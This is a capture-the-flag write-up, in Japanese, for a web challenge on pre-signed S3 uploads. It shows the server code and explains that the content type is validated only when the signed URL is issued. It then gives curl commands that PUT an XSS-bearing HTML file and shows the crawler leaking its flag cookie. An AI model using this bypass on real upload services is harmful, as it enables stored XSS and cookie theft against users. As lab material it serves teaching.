# Pre Signed Upload:Introduction:20pts
Can you spot the flaws in the "Pre Signed URL"?  

- [Target](https://d1382gse6odsg2.cloudfront.net/)  

**source code**  

- [Web Application](https://drive.google.com/file/d/1l1aQRGiZmTzAXoLlCgwEU1tuamI4Jnjt/view?usp=drive_link)  

※ If no announcement is made, all "Crawler" source codes are the same.  

[https://d1382gse6odsg2.cloudfront.net/](https://d1382gse6odsg2.cloudfront.net/)  

# Solution
URLとアプリケーションのソースが渡される。  
クローラは[Server Side Upload](../Server_Side_Upload)と同様なようだ。  
アクセスするとこちらも同様のファイルアップロードサイトのようだ。  
![site.png](site/site.png)  
ソースの主要部分は以下の通りであった。  
```ts
~~~
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const allow = ['image/png', 'image/jpeg', 'image/gif'];
  if (!allow.includes(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
~~~
```
POST時の`contentType`が`['image/png', 'image/jpeg', 'image/gif']`のどれかであるか検証されている。  
その後に署名付きURLが降ってくるので、PUTしてアップロード完了となる。  
その際には`contentType`の検証が無いため、書き換えてPUTしてやればよい。  
Server Side Uploadと同じ、XSSを含むHTMLを用いる。  
```bash
$ curl -X POST -H 'Content-Type: application/json' -d '{"contentType":"image/jpeg","length":221}' --upload-file xs3.html 'https://d1382gse6odsg2.cloudfront.net/api/upload'
{"url":"https://uploadbucket-5b1bc63390-2-upload.s3.ap-northeast-1.amazonaws.com/upload/688dd9c1-5d70-4cf7-b628-f1984f640058?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4GLRJXCV5%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T004305Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkgwRgIhALzlQT%2BN5N%2BMhXLFHWPu8GQESNundYM%2B7RxB3gwT84HdAiEAxvZOI09LWQ9w%2B%2Bv%2FHTTU5Z%2FXlWvITsKNdL1Gw9X3kqUqtwMI4v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgwzMDg1MjE0MDc3MzYiDLs%2BIrdMhUsw29CUwCqLAxaVV5xp40t176DaBteDcdnhXSGCbkQla%2BbMr49%2BzQf44MxY70rYOWfQm8WXD8B8RUWWD%2F06g%2Bdz7yELwtoChhuzaIseYCeXwUvp%2F%2BUVKtAUUOqQ8CuMIH9xBNTl2Twpvs8qo7D1k4BiiQ4UnfKzECDUjg4zFp0lpRHYqRyz2dW7CS3PnPpMcnbgWo6%2BOKTW%2Fpjpuy8LZyXFbRt4o45vu74Htkay4vicxYiRISHyGhFm3geVqkpRwR0NRpABktXw8YvTulxMBJXnfTgyUEJJtThlbS5QhUMMmiCuH9bxD8h9YVekNG%2By2GduuB0BMs%2BdiN9Mg4uG6heRe2NTZhd%2Fc%2FCN61oG%2FmTBjM1v%2FOj3MYe%2FSLxYDsUkXnvOHv7ukK7oJ44Bsne846S35PXlUG1ruJh8jeupNm1RCo51vtqoW9X%2BFnmdn%2FgvBoP%2F4Yf2cX3LOKLzysFGRdmn435%2FsBWgXmGYfgpwslPVMOC2DEcvxJW7soA9i78Rtq2yODDFWMbQ8w0WPdo%2FK%2FLR7V3SMPScmLAGOp0BRk4zt74LtJHRC2iCHJP%2FXNhiyEtRYPTyyP8Yj3iILg0XMpm29zt5AkKO6SoVqQpSMG38G9AiybPZUaKX7Ba0qD60NjYhBFvNvO0PRUQUJXbfjzIVf7BtQo%2B74VkznUCWlJ0vD3zpg0YpcBCShgrWaha81BYD2DZtzS9s0o5ZxuKZvhXjxR09lCrDaVpWg8hYAzhjijRxiL%2F9leNI1A%3D%3D&X-Amz-Signature=be3f5cbb165a775faa24e87f0777f0baf31342996d275892118024937389ad56&X-Amz-SignedHeaders=content-length%3Bhost&x-id=PutObject","filename":"688dd9c1-5d70-4cf7-b628-f1984f640058"}
$ curl -X PUT -H 'Content-Type: text/html' --upload-file xs3.html 'https://uploadbucket-5b1bc63390-2-upload.s3.ap-northeast-1.amazonaws.com/upload/688dd9c1-5d70-4cf7-b628-f1984f640058?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4GLRJXCV5%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T004305Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkgwRgIhALzlQT%2BN5N%2BMhXLFHWPu8GQESNundYM%2B7RxB3gwT84HdAiEAxvZOI09LWQ9w%2B%2Bv%2FHTTU5Z%2FXlWvITsKNdL1Gw9X3kqUqtwMI4v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgwzMDg1MjE0MDc3MzYiDLs%2BIrdMhUsw29CUwCqLAxaVV5xp40t176DaBteDcdnhXSGCbkQla%2BbMr49%2BzQf44MxY70rYOWfQm8WXD8B8RUWWD%2F06g%2Bdz7yELwtoChhuzaIseYCeXwUvp%2F%2BUVKtAUUOqQ8CuMIH9xBNTl2Twpvs8qo7D1k4BiiQ4UnfKzECDUjg4zFp0lpRHYqRyz2dW7CS3PnPpMcnbgWo6%2BOKTW%2Fpjpuy8LZyXFbRt4o45vu74Htkay4vicxYiRISHyGhFm3geVqkpRwR0NRpABktXw8YvTulxMBJXnfTgyUEJJtThlbS5QhUMMmiCuH9bxD8h9YVekNG%2By2GduuB0BMs%2BdiN9Mg4uG6heRe2NTZhd%2Fc%2FCN61oG%2FmTBjM1v%2FOj3MYe%2FSLxYDsUkXnvOHv7ukK7oJ44Bsne846S35PXlUG1ruJh8jeupNm1RCo51vtqoW9X%2BFnmdn%2FgvBoP%2F4Yf2cX3LOKLzysFGRdmn435%2FsBWgXmGYfgpwslPVMOC2DEcvxJW7soA9i78Rtq2yODDFWMbQ8w0WPdo%2FK%2FLR7V3SMPScmLAGOp0BRk4zt74LtJHRC2iCHJP%2FXNhiyEtRYPTyyP8Yj3iILg0XMpm29zt5AkKO6SoVqQpSMG38G9AiybPZUaKX7Ba0qD60NjYhBFvNvO0PRUQUJXbfjzIVf7BtQo%2B74VkznUCWlJ0vD3zpg0YpcBCShgrWaha81BYD2DZtzS9s0o5ZxuKZvhXjxR09lCrDaVpWg8hYAzhjijRxiL%2F9leNI1A%3D%3D&X-Amz-Signature=be3f5cbb165a775faa24e87f0777f0baf31342996d275892118024937389ad56&X-Amz-SignedHeaders=content-length%3Bhost&x-id=PutObject'
```
PUTに成功したら、アップロードURLの`https://d1382gse6odsg2.cloudfront.net/upload/688dd9c1-5d70-4cf7-b628-f1984f640058`をクローラに報告する。  
すると以下のリクエストが到達した。  
```
GET
/?satoki=flag=flag{fc6f76dd4368e888c1bc878b7750b374c891639f}
```
flagが得られた。  

## flag{fc6f76dd4368e888c1bc878b7750b374c891639f}